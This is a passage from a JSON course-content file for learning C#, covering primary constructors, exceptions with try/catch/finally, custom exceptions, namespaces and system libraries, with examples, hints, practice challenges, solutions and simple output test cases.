              "solution": "// Create Vehicle with primary constructor\npublic class Vehicle(string make, string model, int year)\n{\n    public string GetInfo()\n    {\n        return $\"{year} {make} {model}\";\n    }\n}\n\n// Create Car that inherits from Vehicle\npublic class Car(string make, string model, int year, int doors)\n    : Vehicle(make, model, year)\n{\n    public void Describe()\n    {\n        Console.WriteLine($\"{GetInfo()} with {doors} doors\");\n    }\n}\n\n// Test your classes\nvar vehicle = new Vehicle(\"Honda\", \"Civic\", 2024);\nConsole.WriteLine(vehicle.GetInfo());\n\nvar car = new Car(\"Toyota\", \"Camry\", 2023, 4);\ncar.Describe();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain a year",
                  "expectedOutput": "202",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain 'doors'",
                  "expectedOutput": "doors",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Primary constructor syntax: class ClassName(Type param1, Type param2). Parameters are available throughout the class."
                },
                {
                  "level": 2,
                  "text": "For inheritance, use: class Derived(params) : Base(baseParams). Pass the needed parameters to the base constructor."
                },
                {
                  "level": 3,
                  "text": "Use string interpolation ($\"...\") to format strings with the constructor parameters."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting to pass parameters to base class",
                  "consequence": "When inheriting, you must explicitly pass required parameters to the base class primary constructor using : Base(params) syntax.",
                  "correction": "class Car(string make, int year) : Vehicle(make, year)"
                },
                {
                  "mistake": "Thinking parameters are public properties",
                  "consequence": "Primary constructor parameters are captured privately. To expose them, create explicit properties.",
                  "correction": "Add: public string Make { get; } = make;"
                },
                {
                  "mistake": "Using primary constructors for mutable state",
                  "consequence": "Parameters are captured by value at construction. They work best for initialization data, not frequently changing state.",
                  "correction": "Use traditional fields/properties for mutable state."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-08",
      "title": "Advanced OOP Concepts",
      "description": "Explore inheritance, polymorphism, abstract classes, interfaces, and advanced object-oriented patterns.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-08-01",
          "title": "Exceptions & try/catch (Planning for Problems)",
          "moduleId": "module-08",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're driving a car. Most of the time everything works fine, but what if you get a flat tire? You need a PLAN: pull over safely, turn on hazards, call for help.\n\nThat's what EXCEPTIONS are in programming! They're unexpected problems that happen while your code runs:\n• User enters text instead of a number\n• File doesn't exist when you try to open it\n• Network connection drops\n• Division by zero\n\nWithout a plan, your program CRASHES! With try/catch, you handle the problem gracefully:\n• TRY: 'Try to do this risky thing'\n• CATCH: 'If something goes wrong, do this instead'\n\nThink: try/catch = 'Attempt the task, but have a backup plan if it fails.' Your program stays running instead of crashing!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// WITHOUT exception handling - program crashes!\nstring input = \"abc\";\nint number = int.Parse(input);  // CRASH! Can't convert \"abc\" to number\nConsole.WriteLine(\"This never runs\");\n\n// WITH exception handling - graceful recovery\ntry\n{\n    string userInput = \"abc\";\n    int num = int.Parse(userInput);  // This fails...\n    Console.WriteLine(\"Success: \" + num);  // Never reached\n}\ncatch (FormatException ex)\n{\n    Console.WriteLine(\"Error: That's not a valid number!\");\n    Console.WriteLine(\"Please enter digits only.\");\n}\nConsole.WriteLine(\"Program continues running!\");\n\n// Multiple catch blocks for different errors\ntry\n{\n    int[] numbers = { 1, 2, 3 };\n    Console.WriteLine(numbers[10]);  // Index out of range!\n}\ncatch (IndexOutOfRangeException ex)\n{\n    Console.WriteLine(\"Error: Array index too large!\");\n}\ncatch (Exception ex)  // Generic catch for any other error\n{\n    Console.WriteLine(\"Something went wrong: \" + ex.Message);\n}\n\n// EXCEPTION FILTERS with 'when' clause (C# 6+)\n// The catch block ONLY runs if the condition is true!\ntry\n{\n    throw new HttpRequestException(\"Not Found\", null, System.Net.HttpStatusCode.NotFound);\n}\ncatch (HttpRequestException ex) when (ex.StatusCode == System.Net.HttpStatusCode.NotFound)\n{\n    Console.WriteLine(\"Page not found (404)\");  // Specific handling\n}\ncatch (HttpRequestException ex) when (ex.StatusCode == System.Net.HttpStatusCode.Unauthorized)\n{\n    Console.WriteLine(\"Access denied (401)\");  // Different handling\n}\ncatch (HttpRequestException ex)\n{\n    Console.WriteLine(\"HTTP error: \" + ex.Message);  // Fallback\n}\n\n// 'when' filters preserve the original stack trace!\n// The filter is evaluated BEFORE the stack unwinds",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`try { risky code }`**: The 'try' block contains code that MIGHT fail. If any line throws an exception, execution immediately jumps to the catch block.\n\n**`catch (ExceptionType ex) { handle }`**: 'catch' runs ONLY if an exception occurs in the try block. ExceptionType specifies what kind of error to catch. 'ex' is a variable holding error details.\n\n**`catch (Exception ex) when (condition)`**: Exception FILTER! The catch block only runs if BOTH the exception type matches AND the 'when' condition is true. The filter is evaluated BEFORE unwinding the stack, preserving the original StackTrace!\n\n**`Multiple catch blocks`**: You can have multiple catch blocks for different exception types! They're checked in order. Put specific exceptions first, generic (Exception) last.\n\n**`ex.Message`**: The exception object 'ex' has properties: Message (error description), StackTrace (where error occurred). Useful for debugging!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Empty catch blocks**: Writing `catch { }` swallows errors silently! ALWAYS log or handle errors. Silent failures are impossible to debug.\n\n**Catching Exception first**: If you put `catch (Exception ex)` FIRST, it catches everything! More specific catch blocks after it will never run.\n\n**Forgetting to use exception filters**: Instead of complex if-statements inside catch blocks, use 'when' filters: `catch (HttpException ex) when (ex.StatusCode == 404)`. Cleaner AND preserves stack trace!\n\n**Not re-throwing properly**: Use `throw;` (not `throw ex;`) to re-throw while preserving the original stack trace."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-08-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a safe calculator that handles errors!\n\n1. Prompt user for two numbers (use int.Parse)\n2. Prompt for operation (+, -, *, /)\n3. Wrap risky code in try/catch:\n   - Catch FormatException (invalid number input)\n   - Catch DivideByZeroException (division by zero)\n   - Catch general Exception (anything else)\n4. Display appropriate error messages\n5. If successful, show the result",
              "starterCode": "try\n{\n    Console.WriteLine(\"Enter first number:\");\n    // Parse input\n    \n    Console.WriteLine(\"Enter second number:\");\n    // Parse input\n    \n    Console.WriteLine(\"Enter operation (+, -, *, /):\");\n    string op = Console.ReadLine();\n    \n    // Perform calculation\n    int result = 0;\n    \n    Console.WriteLine(\"Result: \" + result);\n}\ncatch (FormatException ex)\n{\n    // Handle invalid number\n}\ncatch (DivideByZeroException ex)\n{\n    // Handle division by zero\n}\ncatch (Exception ex)\n{\n    // Handle any other error\n}",
              "solution": "try\n{\n    Console.WriteLine(\"Enter first number:\");\n    int num1 = int.Parse(Console.ReadLine());\n    \n    Console.WriteLine(\"Enter second number:\");\n    int num2 = int.Parse(Console.ReadLine());\n    \n    Console.WriteLine(\"Enter operation (+, -, *, /):\");\n    string op = Console.ReadLine();\n    \n    int result = 0;\n    if (op == \"+\") result = num1 + num2;\n    else if (op == \"-\") result = num1 - num2;\n    else if (op == \"*\") result = num1 * num2;\n    else if (op == \"/\") result = num1 / num2;\n    \n    Console.WriteLine(\"Result: \" + result);\n}\ncatch (FormatException ex)\n{\n    Console.WriteLine(\"Error: Please enter valid numbers only!\");\n}\ncatch (DivideByZeroException ex)\n{\n    Console.WriteLine(\"Error: Cannot divide by zero!\");\n}\ncatch (Exception ex)\n{\n    Console.WriteLine(\"Unexpected error: \" + ex.Message);\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Result\"",
                  "expectedOutput": "Result",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Error\"",
                  "expectedOutput": "Error",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Wrap ALL risky code in the try block. Use specific exception types in catch blocks. Order matters: specific exceptions before generic ones!"
                },
                {
                  "level": 2,
                  "text": "Catching Exception first: If you put 'catch (Exception ex)' FIRST, it catches EVERYTHING! Specific catches after it never run. Always put specific exceptions before generic Exception."
                },
                {
                  "level": 3,
                  "text": "Empty catch blocks: 'catch { }' swallows errors silently! Always log or display error messages. Silent failures are impossible to debug."
                },
                {
                  "level": 4,
                  "text": "Try without catch: 'try { code }' alone is ERROR! Must have at least one catch block (or finally, next lesson). Try/catch are partners."
                },
                {
                  "level": 5,
                  "text": "Catching wrong exception type: If you catch FormatException but the error is IndexOutOfRangeException, your catch won't run! Use general Exception catch as fallback."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Catching Exception first",
                  "consequence": "If you put 'catch (Exception ex)' FIRST, it catches EVERYTHING! Specific catches after it never run. Always put specific exceptions before generic Exception.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Empty catch blocks",
                  "consequence": "'catch { }' swallows errors silently! Always log or display error messages. Silent failures are impossible to debug.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Try without catch",
                  "consequence": "'try { code }' alone is ERROR! Must have at least one catch block (or finally, next lesson). Try/catch are partners.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Catching wrong exception type",
                  "consequence": "If you catch FormatException but the error is IndexOutOfRangeException, your catch won't run! Use general Exception catch as fallback.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-08-02",
          "title": "The finally Block & Custom Exceptions",
          "moduleId": "module-08",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine borrowing a book from the library. Whether you finish reading it OR give up halfway, you MUST return the book! That's a 'finally' action - it happens NO MATTER WHAT.\n\nThe FINALLY BLOCK runs whether the try succeeds OR an exception is caught:\n• Try succeeds → finally runs\n• Exception caught → finally runs\n• Exception NOT caught → finally runs (then exception propagates)\n\nUse finally for CLEANUP: close files, release resources, disconnect from databases.\n\nCUSTOM EXCEPTIONS: Sometimes built-in exceptions aren't specific enough. Create your own!\n• InvalidAgeException for age validation\n• InsufficientFundsException for banking\n• GameOverException for game logic\n\nThink: finally = 'Always do this, no matter what!' Custom exceptions = 'Create your own error types for your domain.'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// FINALLY block example\ntry\n{\n    Console.WriteLine(\"Opening file...\");\n    // Risky file operations\n    throw new Exception(\"File corrupted!\");\n    Console.WriteLine(\"This won't run\");\n}\ncatch (Exception ex)\n{\n    Console.WriteLine(\"Error: \" + ex.Message);\n}\nfinally\n{\n    Console.WriteLine(\"Closing file...\");  // ALWAYS runs!\n    // Cleanup code here\n}\n\n// CUSTOM EXCEPTION - create your own!\nclass InvalidAgeException : Exception\n{\n    public InvalidAgeException(string message) : base(message)\n    {\n    }\n}\n\nclass Person\n{\n    private int _age;\n    \n    public int Age\n    {\n        get { return _age; }\n        set\n        {\n            if (value < 0 || value > 120)\n            {\n                throw new InvalidAgeException(\"Age must be between 0 and 120!\");\n            }\n            _age = value;\n        }\n    }\n}\n\n// Using custom exception\ntry\n{\n    Person person = new Person();\n    person.Age = 150;  // Throws InvalidAgeException!\n}\ncatch (InvalidAgeException ex)\n{\n    Console.WriteLine(\"Custom error: \" + ex.Message);\n}\nfinally\n{\n    Console.WriteLine(\"Validation complete.\");\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`finally { cleanup code }`**: Finally block runs AFTER try and catch, ALWAYS! Use for cleanup: closing files, releasing resources. Runs even if exception is thrown.\n\n**`class CustomException : Exception`**: Create custom exception by inheriting from Exception class. Naming convention: end with 'Exception' (InvalidAgeException, not InvalidAge).\n\n**`: base(message)`**: Call base constructor with error message. This passes the message to the Exception class, so ex.Message works.\n\n**`throw new CustomException()`**: 'throw' keyword creates and throws an exception. Program immediately jumps to nearest catch block that handles this exception type.\n\n**`using statement`**: Modern C# alternative to finally for disposable resources: `using (var file = File.OpenRead(path)) { }` automatically closes file when block ends. Even cleaner: `using var file = File.OpenRead(path);` (C# 8+)."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Returning in finally**: A `return` statement in finally overrides returns in try/catch! This is confusing - avoid returning from finally blocks.\n\n**Finally for business logic**: Finally is for CLEANUP only (close files, release locks). Don't put important app logic there - use regular code flow.\n\n**Forgetting : base(message)**: Custom exceptions without `: base(message)` lose the error message! Always pass it to the base constructor.\n\n**Prefer 'using' over finally for resources**: For IDisposable objects (files, connections), the `using` statement is cleaner than try/finally and guarantees cleanup.\n\n**Throwing in finally**: If you throw an exception in finally while another exception is propagating, the original exception is LOST! Never throw in finally blocks."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-08-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a banking system with custom exception and finally!\n\n1. CUSTOM EXCEPTION 'InsufficientFundsException':\n   - Inherits from Exception\n   - Constructor accepts message\n\n2. CLASS 'BankAccount':\n   - Property: decimal Balance\n   - Method Withdraw(amount):\n     - If amount > Balance, throw InsufficientFundsException\n     - Otherwise, subtract amount\n\n3. In main code:\n   - Create account with balance $100\n   - Try to withdraw $150 (will throw exception)\n   - Catch InsufficientFundsException\n   - Finally: Display \"Transaction complete\"",
              "starterCode": "class InsufficientFundsException : Exception\n{\n    // Constructor\n}\n\nclass BankAccount\n{\n    public decimal Balance;\n    \n    public void Withdraw(decimal amount)\n    {\n        // Check balance, throw if insufficient\n        // Otherwise subtract\n    }\n}\n\n// Test the system\ntry\n{\n    BankAccount account = new BankAccount();\n    account.Balance = 100;\n    \n    Console.WriteLine(\"Balance: $\" + account.Balance);\n    account.Withdraw(150);  // Should throw exception\n    Console.WriteLine(\"Withdrawal successful!\");\n}\ncatch (InsufficientFundsException ex)\n{\n    // Handle error\n}\nfinally\n{\n    // Always runs\n}",
              "solution": "class InsufficientFundsException : Exception\n{\n    public InsufficientFundsException(string message) : base(message)\n    {\n    }\n}\n\nclass BankAccount\n{\n    public decimal Balance;\n    \n    public void Withdraw(decimal amount)\n    {\n        if (amount > Balance)\n        {\n            throw new InsufficientFundsException(\"Insufficient funds for withdrawal!\");\n        }\n        Balance -= amount;\n    }\n}\n\ntry\n{\n    BankAccount account = new BankAccount();\n    account.Balance = 100;\n    \n    Console.WriteLine(\"Balance: $\" + account.Balance);\n    account.Withdraw(150);\n    Console.WriteLine(\"Withdrawal successful!\");\n}\ncatch (InsufficientFundsException ex)\n{\n    Console.WriteLine(\"Error: \" + ex.Message);\n}\nfinally\n{\n    Console.WriteLine(\"Transaction complete.\");\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Balance\"",
                  "expectedOutput": "Balance",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Error\"",
                  "expectedOutput": "Error",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Transaction complete\"",
                  "expectedOutput": "Transaction complete",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Custom exception: 'class MyException : Exception'. Constructor: ': base(message)'. Throw: 'throw new MyException(\"message\")'. Finally always runs after try/catch!"
                },
                {
                  "level": 2,
                  "text": "Forgetting base constructor: 'class MyEx : Exception { }' without constructor works, but you can't pass custom messages! Always add constructor with ': base(message)'."
                },
                {
                  "level": 3,
                  "text": "Finally for logic: Finally is for CLEANUP, not business logic! Don't put critical app logic in finally - use it for closing files, releasing locks, etc."
                },
                {
                  "level": 4,
                  "text": "Return in finally: 'return' in finally block overrides return in try/catch! Avoid returning values from finally - it's confusing and error-prone."
                },
                {
                  "level": 5,
                  "text": "Not throwing custom exception: Creating 'new InvalidAgeException()' without 'throw' does nothing! Must use 'throw new InvalidAgeException()' to actually throw it."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting base constructor",
                  "consequence": "'class MyEx : Exception { }' without constructor works, but you can't pass custom messages! Always add constructor with ': base(message)'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Finally for logic",
                  "consequence": "Finally is for CLEANUP, not business logic! Don't put critical app logic in finally - use it for closing files, releasing locks, etc.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Return in finally",
                  "consequence": "'return' in finally block overrides return in try/catch! Avoid returning values from finally - it's confusing and error-prone.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not throwing custom exception",
                  "consequence": "Creating 'new InvalidAgeException()' without 'throw' does nothing! Must use 'throw new InvalidAgeException()' to actually throw it.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-08-03",
          "title": "Namespaces (Organizing Your Blueprints)",
          "moduleId": "module-08",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a huge library with 100,000 books all mixed together on one shelf! Finding 'The Great Gatsby' would be impossible. Instead, libraries organize books:\n• Fiction → Mystery → Author Name\n• Non-Fiction → Science → Biology\n\nThat's what NAMESPACES do for code! They're FOLDERS for organizing classes:\n• System.Collections.Generic → List, Dictionary\n• System.IO → File, Directory\n• YourApp.Models → Customer, Product\n• YourApp.Services → EmailService, PaymentService\n\nNamespaces prevent NAMING CONFLICTS: Microsoft can have 'Microsoft.UI.Button' and you can have 'MyApp.CustomControls.Button' - different namespaces, no conflict!\n\nThink: namespace = 'The organizational folder path for your code.' Without namespaces, large projects become chaos!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// DEFINING a namespace\nnamespace MyApp.Models\n{\n    class Customer\n    {\n        public string Name;\n        public string Email;\n    }\n    \n    class Product\n    {\n        public string Name;\n        public decimal Price;\n    }\n}\n\nnamespace MyApp.Services\n{\n    class EmailService\n    {\n        public void SendEmail(string to, string message)\n        {\n            Console.WriteLine(\"Sending email to: \" + to);\n        }\n    }\n}\n\n// USING namespaces\nusing System;\nusing System.Collections.Generic;\nusing MyApp.Models;  // Now we can use Customer, Product directly!\n\nnamespace MyApp\n{\n    class Program\n    {\n        static void Main()\n        {\n            // Without 'using MyApp.Models', we'd need:\n            // MyApp.Models.Customer c = new MyApp.Models.Customer();\n            \n            // With 'using MyApp.Models':\n            Customer customer = new Customer();\n            customer.Name = \"John\";\n            \n            List<Product> products = new List<Product>();\n            // List comes from System.Collections.Generic (using statement)\n        }\n    }\n}\n\n// GLOBAL USINGS (.NET 6+ / C# 10+)\n// In a GlobalUsings.cs file - applies to ALL files in project!\nglobal using System;\nglobal using System.Collections.Generic;\nglobal using System.Linq;\n// No need to repeat 'using System;' in every file!\n\n// IMPLICIT USINGS (.NET 6+)\n// In .csproj: <ImplicitUsings>enable</ImplicitUsings>\n// Automatically includes: System, System.Collections.Generic,\n// System.IO, System.Linq, System.Threading.Tasks, and more!\n// Check obj/Debug/net8.0/GlobalUsings.g.cs to see what's included\n\n// FILE-SCOPED NAMESPACES (C# 10+) - cleaner!\nnamespace MyApp.Models;  // Note the semicolon!\n\nclass Order  // No extra indentation needed!\n{\n    public int Id { get; set; }\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`namespace Name { }`**: Namespace wraps your classes. Use PascalCase. Dot notation for hierarchy: Company.Product.Feature (like folder paths!).\n\n**`namespace Name;`**: FILE-SCOPED namespace (C# 10+). Applies to entire file - no braces or indentation needed! Cleaner for single-namespace files.\n\n**`using Namespace;`**: 'using' at top of file imports a namespace. Now you can use classes from that namespace without full path. Like 'import' in other languages.\n\n**`global using Namespace;`**: GLOBAL USING (C# 10+). Put in GlobalUsings.cs - applies to ALL files in project! No need to repeat common usings everywhere.\n\n**`<ImplicitUsings>enable</ImplicitUsings>`**: In .csproj enables IMPLICIT USINGS. .NET 6+ projects auto-include System, System.Linq, System.Collections.Generic, etc. See generated file in obj/ folder.\n\n**`Fully qualified name`**: Full path to a class: 'System.Collections.Generic.List<int>'. Using statements let you skip the path: just 'List<int>'.\n\n**`Namespace organization`**: Convention: YourApp.Models (data classes), YourApp.Services (business logic), YourApp.Views (UI). Organize by feature or layer!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Circular dependencies**: If namespace A uses B and B uses A, you'll get confusing errors! Organize so dependencies flow one way: Models -> Services -> UI.\n\n**Missing using in other namespaces**: If MyStore.Services needs Product from MyStore.Models, you still need `using MyStore.Models;` inside that file!\n\n**Implicit usings confusion**: When `<ImplicitUsings>` is enabled, you might use types without realizing they're auto-imported. Check obj/Debug/net8.0/GlobalUsings.g.cs to see what's included.\n\n**Namespace vs folder mismatch**: By convention, namespace should match folder structure. File at 'MyApp/Models/Customer.cs' should have 'namespace MyApp.Models'. Not required, but strongly recommended.\n\n**Mixing file-scoped and block namespaces**: A file can have EITHER 'namespace Foo;' (file-scoped) OR 'namespace Foo { }' (block), not both. Pick one style per file."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-08-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a multi-namespace project structure!\n\n1. NAMESPACE 'MyStore.Models':\n   - Class Product: string Name, decimal Price\n\n2. NAMESPACE 'MyStore.Services':\n   - Class ShoppingCart:\n     - List<Product> Items\n     - Method AddItem(Product p): adds to Items, prints confirmation\n     - Method GetTotal(): returns sum of all item prices\n\n3. NAMESPACE 'MyStore':\n   - Import both namespaces with 'using'\n   - Create products\n   - Create cart, add products\n   - Display total",
              "starterCode": "using System;\nusing System.Collections.Generic;\n// Add using statements for your namespaces\n\nnamespace MyStore.Models\n{\n    // Define Product class\n}\n\nnamespace MyStore.Services\n{\n    // Define ShoppingCart class\n    // Don't forget: you'll need 'using MyStore.Models;' here to use Product!\n}\n\nnamespace MyStore\n{\n    class Program\n    {\n        static void Main()\n        {\n            // Create products\n            // Create cart\n            // Add items\n            // Display total\n        }\n    }\n}",
              "solution": "using System;\nusing System.Collections.Generic;\nusing MyStore.Models;\nusing MyStore.Services;\n\nnamespace MyStore.Models\n{\n    class Product\n    {\n        public string Name;\n        public decimal Price;\n    }\n}\n\nnamespace MyStore.Services\n{\n    using MyStore.Models;\n    \n    class ShoppingCart\n    {\n        public List<Product> Items = new List<Product>();\n        \n        public void AddItem(Product p)\n        {\n            Items.Add(p);\n            Console.WriteLine(\"Added: \" + p.Name);\n        }\n        \n        public decimal GetTotal()\n        {\n            decimal total = 0;\n            foreach (Product item in Items)\n            {\n                total += item.Price;\n            }\n            return total;\n        }\n    }\n}\n\nnamespace MyStore\n{\n    class Program\n    {\n        static void Main()\n        {\n            Product p1 = new Product() { Name = \"Laptop\", Price = 999.99m };\n            Product p2 = new Product() { Name = \"Mouse\", Price = 29.99m };\n            \n            ShoppingCart cart = new ShoppingCart();\n            cart.AddItem(p1);\n            cart.AddItem(p2);\n            \n            Console.WriteLine(\"Total: $\" + cart.GetTotal());\n        }\n    }\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Added\"",
                  "expectedOutput": "Added",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Total\"",
                  "expectedOutput": "Total",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Define namespaces: 'namespace Name { class C { } }'. Import: 'using Name;' at top of file. Nested namespaces use dots: Company.Product.Feature."
                },
                {
                  "level": 2,
                  "text": "Circular using statements: If namespace A uses B, and B uses A, you can get confusing errors! Organize code so dependencies flow one direction (Models → Services → UI)."
                },
                {
                  "level": 3,
                  "text": "Forgetting using in nested namespaces: If MyStore.Services needs Product from MyStore.Models, you must add 'using MyStore.Models;' INSIDE the Services namespace block!"
                },
                {
                  "level": 4,
                  "text": "Namespace doesn't match folder: By convention, namespace should match folder structure! File at 'MyApp/Models/Customer.cs' should have 'namespace MyApp.Models'. Not required, but strong convention."
                },
                {
                  "level": 5,
                  "text": "Using vs namespace: 'using System;' IMPORTS a namespace (at top of file). 'namespace MyApp { }' DEFINES a namespace (wraps your code). Don't confuse them!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Circular using statements",
                  "consequence": "If namespace A uses B, and B uses A, you can get confusing errors! Organize code so dependencies flow one direction (Models → Services → UI).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting using in nested namespaces",
                  "consequence": "If MyStore.Services needs Product from MyStore.Models, you must add 'using MyStore.Models;' INSIDE the Services namespace block!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Namespace doesn't match folder",
                  "consequence": "By convention, namespace should match folder structure! File at 'MyApp/Models/Customer.cs' should have 'namespace MyApp.Models'. Not required, but strong convention.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using vs namespace",
                  "consequence": "'using System;' IMPORTS a namespace (at top of file). 'namespace MyApp { }' DEFINES a namespace (wraps your code). Don't confuse them!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-08-04",
          "title": "Using System Libraries (Built-In Tools)",
          "moduleId": "module-08",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine building a house. You COULD make your own hammer, saw, and nails from scratch... or you could buy them from a hardware store! Much faster!\n\nThat's what SYSTEM LIBRARIES are - pre-built tools that come with .NET:\n• System.Collections.Generic → List, Dictionary, Queue\n• System.IO → Reading/writing files\n• System.Linq → Querying data (next module!)\n• System.Text → String manipulation, StringBuilder\n• System.DateTime → Dates and times\n\nThese are BATTLE-TESTED, OPTIMIZED tools used by millions of developers. Don't reinvent the wheel!\n\nThink: System libraries = 'The free toolbox that comes with C#.' Learning what's available saves HUNDREDS of hours of coding!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Text;\n\n// COLLECTIONS (System.Collections.Generic)\nList<string> names = new List<string>();\nnames.Add(\"Alice\");\nnames.Add(\"Bob\");\n\nDictionary<string, int> ages = new Dictionary<string, int>();\nages[\"Alice\"] = 30;\nages[\"Bob\"] = 25;\n\n// FILE I/O (System.IO)\nstring path = \"test.txt\";\nFile.WriteAllText(path, \"Hello from C#!\");\nstring content = File.ReadAllText(path);\nConsole.WriteLine(content);\n\nif (File.Exists(path))\n{\n    Console.WriteLine(\"File exists!\");\n}\n\n// STRING MANIPULATION (System.Text)\nStringBuilder sb = new StringBuilder();\nsb.Append(\"Hello\");\nsb.Append(\" \");\nsb.Append(\"World\");\nstring result = sb.ToString();\nConsole.WriteLine(result);\n\n// DATE/TIME (System)\nDateTime now = DateTime.Now;\nConsole.WriteLine(\"Current time: \" + now);\n\nDateTime birthday = new DateTime(1990, 5, 15);\nTimeSpan age = now - birthday;\nConsole.WriteLine(\"Days old: \" + age.TotalDays);\n\n// MATH (System)\ndouble squareRoot = Math.Sqrt(16);\ndouble power = Math.Pow(2, 8);  // 2^8\nint max = Math.Max(10, 20);\nConsole.WriteLine(\"Max: \" + max);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`System.IO namespace`**: File operations: File.ReadAllText(), File.WriteAllText(), File.Exists(), Directory.CreateDirectory(). Essential for working with files!\n\n**`StringBuilder`**: From System.Text. Use when concatenating strings in loops! String concat creates new objects (slow). StringBuilder modifies in-place (fast).\n\n**`DateTime`**: From System. DateTime.Now (current), DateTime.Today (date only). Arithmetic: subtract dates to get TimeSpan. Format with .ToString(\"yyyy-MM-dd\").\n\n**`DateOnly and TimeOnly`**: .NET 6+ added DateOnly (just date, no time) and TimeOnly (just time, no date). Cleaner than DateTime when you only need one!\n\n**`Math class`**: Static methods: Math.Sqrt(), Math.Pow(), Math.Round(), Math.Abs(), Math.Min(), Math.Max(). From System namespace.\n\n**`Path.Combine()`**: Cross-platform path building: `Path.Combine(\"folder\", \"file.txt\")` works on both Windows and Linux/Mac!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
